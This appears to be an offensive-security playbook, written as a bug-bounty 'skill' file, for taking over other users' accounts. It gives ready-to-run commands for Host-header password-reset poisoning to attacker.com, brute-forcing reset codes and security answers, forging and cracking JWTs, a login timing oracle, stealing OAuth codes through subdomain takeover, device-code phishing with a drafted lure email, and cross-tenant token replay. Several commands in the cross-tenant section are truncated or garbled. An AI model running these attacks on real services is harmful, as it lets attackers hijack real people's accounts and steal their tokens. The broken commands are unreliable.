---
name: hunt-ato
description: "Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (alg:none, RS256→HS256 key confusion, weak HMAC secret, kid injection), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical."
sources: field_recon, hackerone_public, portswigger_research
report_count: 42
---

## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap
# OR keep real Host and add one of:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak
```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

### Path 3: Predictable / Weak Reset Tokens
```bash
# 6-digit numeric OTP-style reset code, no rate limit:
ffuf -u "https://target.com/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

### Path 4: Token No-Expiry / Reuse / Cross-Account
```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

### Path 6: JWT Manipulation
```bash
# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
#
# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
#
# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
#
# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

### Path 7: Password Change Without Step-Up + Login Oracle
```bash
# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field
#
# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

### Path 8: Social-Recovery / Security-Question Abuse
```bash
# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5
# also test: answers returned/echoed in /api/me or recovery page source (client-side check)
# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### ATO Severity Gate
- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).
- **Low** — attacker must be MitM, or only self-account impact.

## Path 10: OAuth Device Code Flow Abuse (RFC 8628)

The Device Authorization Grant (OAuth device flow) is designed for input-constrained devices, but
attackers abuse it for phishing, MFA bypass, and cross-tenant token theft.

### How the flow works (abused):
1. Client requests device code: `POST /oauth/devicecode` with `client_id` + `scope`
2. Server returns: `device_code`, `user_code`, `verification_uri`, `interval`
3. Attacker tricks victim into visiting `verification_uri` and entering `user_code`
4. Victim authenticates (often MFA-less on device flow) and authorizes
5. Attacker polls `POST /oauth/token` with `device_code` → receives access/refresh tokens

### Attack vectors:

**A. Phishing with device codes (ATO via authorization code theft)**
```bash
# Step 1: Request a device code from the OAuth provider
curl -X POST "https://target.com/oauth/devicecode" \
  -d "client_id=VICTIM_CLIENT_ID&scope=openid profile email offline_access"

# Response: {"device_code":"...","user_code":"ABCD-1234","verification_uri":"https://target.com/device","interval":5}

# Step 2: Craft phishing email: "Please verify your account at https://target.com/device
#          and enter code: ABCD-1234 to unlock your account"
# Step 3: Victim enters code on legitimate OAuth page → authenticates
# Step 4: Attacker polls for token:
curl -X POST "https://target.com/oauth/token" \
  -d "client_id=VICTIM_CLIENT_ID&grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=THE_DEVICE_CODE"

# → Attacker receives victim's access_token + refresh_token → full ATO
```

**B. MFA bypass via device flow**
Many OAuth providers do NOT enforce MFA on the device authorization endpoint because "devices
can't do MFA." If the authorization code / implicit flow requires MFA but device flow doesn't:
```bash
# Compare: standard auth requires MFA
GET /oauth/authorize?response_type=code&client_id=xxx&redirect_uri=xxx
# → MFA challenge

# Device flow skips MFA entirely
POST /oauth/devicecode
# → No MFA, direct token grant
# Proof: if your account has MFA enabled but device flow produces tokens without MFA → finding
```

**C. Cross-tenant device code (Azure AD / Entra ID)**
Azure AD device codes are tenant-agnostic — the `user_code` works on any tenant's verification page:
```bash
# Attacker requests device_code from Azure AD common endpoint (any tenant):
curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -d "client_id=YOUR_CLIENT_ID&scope=user.read"

# Victim at ANOTHER organization enters the user_code
# If their tenant trusts the app → victim's token issued → cross-tenant ATO
```

**D. Detection — find device flow endpoints:**
```bash
# Check OAuth authorization server metadata
curl -s "https://target.com/.well-known/oauth-authorization-server" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('device_authorization_endpoint','NOT SUPPORTED'))"

# Probe common device code endpoints
curl -s -X POST "https://target.com/oauth/devicecode" -d "client_id=test&scope=openid" -w "\nHTTP %{http_code}"
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -d "client_id=test&scope=user.read" -w "\nHTTP %{http_code}"
```

## Path 11: PKCE Bypass Chain

PKCE (Proof Key for Code Exchange, RFC 7636) is designed to protect the authorization code flow
in public clients. Many implementations fail to enforce it correctly:

### Bypass 1: No PKCE enforcement
```bash
# Send auth request WITHOUT code_challenge
GET /oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://app.com/cb

# Exchange code WITHOUT code_verifier
POST /oauth/token
grant_type=authorization_code
code=AUTH_CODE
redirect_uri=https://app.com/cb
# If accepted → PKCE not enforced → authorization code interception vulnerability
```

### Bypass 2: code_challenge_method=plain (should be S256)
```bash
# Auth request with plain challenge (SHA256 should be required)
GET /oauth/authorize?response_type=code&client_id=xxx&code_challenge_method=plain&code_challenge=ATTACKER_STATIC_VALUE

# Exchange with corresponding code_verifier
POST /oauth/token
grant_type=authorization_code
code=AUTH_CODE
code_verifier=ATTACKER_STATIC_VALUE
redirect_uri=https://app.com/cb
# If accepted → plain method exposes the PKCE challenge to MitM
```

### Bypass 3: code_challenge accepted but code_verifier not validated
```bash
# Auth request WITH code_challenge=S256:<hash>
# Token exchange WITHOUT code_verifier or with wrong code_verifier:
POST /oauth/token
grant_type=authorization_code
code=AUTH_CODE
# no code_verifier field
# If token issued → PKCE is decorative, not enforced
```

### Bypass 4: Reuse authorization code after PKCE exchange
Some servers expire the code but accept the same PKCE verifier twice:
```bash
# Exchange code once → success
# Exchange same code again with same code_verifier → if second exchange also works → code replay
```

### Full PKCE bypass detection script:
```bash
# Test PKCE enforcement with various combinations:
for cc in "" "code_challenge_method=S256&code_challenge=$(echo -n 'test' | openssl dgst -sha256 -binary | base64 | tr '+/' '-_' | tr -d '=')"; do
  for cv in "" "test" "wrong_value"; do
    echo "=== cc=[$cc] cv=[$cv] ==="
    # Step 1: get auth code
    code=$(curl -s -o /dev/null -w "%{redirect_url}" \
      "https://target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://app.com/cb&state=x$cc" \
      | grep -oP 'code=\K[^&]+')
    [[ -z "$code" ]] && echo "NO CODE" && continue
    # Step 2: exchange
    resp=$(curl -s -X POST "https://target.com/oauth/token" \
      -d "grant_type=authorization_code&code=$code&redirect_uri=https://app.com/cb$([[ -n "$cv" ]] && echo "&code_verifier=$cv")")
    echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print('TOKEN' if 'access_token' in d else d.get('error','unknown'))"
  done
done
```

## Path 12: Cross-Tenant ATO (Azure AD / Entra ID)

Cross-tenant attacks exploit trust relationships between Azure AD tenants and multi-tenant OAuth apps.

### Attack 1: prompt=none silent auth abuse
```bash
# If an app allows multi-tenant authentication, prompt=none skips the login UI:
GET /oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://app.com/cb&prompt=none&login_hint=victim@victim-tenant.com&domain_hint=organizations

# If the user has an existing session with the app → code issued silently
# If prompt=none is accepted by the authorization server but the user ISN'T logged in →
#   the server returns error=login_required instead of prompting, which still confirms the
#   user's existence (enumeration via OAuth)
```

### Attack 2: Tenant ID / domain_hint manipulation
```bash
# Azure AD multi-tenant apps often validate tenant from the token, not the request
# Try swapping tenant IDs:
GET /victim-tenant.onmicrosoft.com/oauth/authorize?...
# vs:
GET /attacker-tenant.onmicrosoft.com/oauth/authorize?...
# If the app accepts tokens from BOTH tenants → cross-tenant token replay possible

# Test with curl:
curl -v "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=xxx&response_type=code&redirect_uri=https://app.com/cb&domain_hunt=organizations&state=test"
```

### Attack 3: Cross-tenant token replay
```bash
# 1. Register same app client_id in YOUR tenant
# 2. Authenticate as user in YOUR tenant → get access_token
# 3. Use that token against the VICTIM's tenant API
curl -H "Authorization: Bearer *** https://victim-tenant.com/api/user/me
# If accepted → the app doesn't validate the "tid" (tenant ID) claim → cross-tenant ATO
```

### Detection — find cross-tenant vulnerabilities:
```bash
# Check if app is multi-tenant by probing with unauthorized tenant credentials
curl -s -H "Authorization: Bearer *** -s -X POST 'https://login.microsoftonline.com/attacker-tenant.onmicrosoft.com/oauth2/v2.0/token' -d 'client_id=xxx&scope=https://target.com/.default&grant_type=client_credentials&client_secret=xxx' | python3 -c 'import sys,json; print(json.load(sys.stdin).get("access_token",""))')" "https://target.com/api/user/me" -w "\nHTTP %{http_code}"
```

---

## Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.
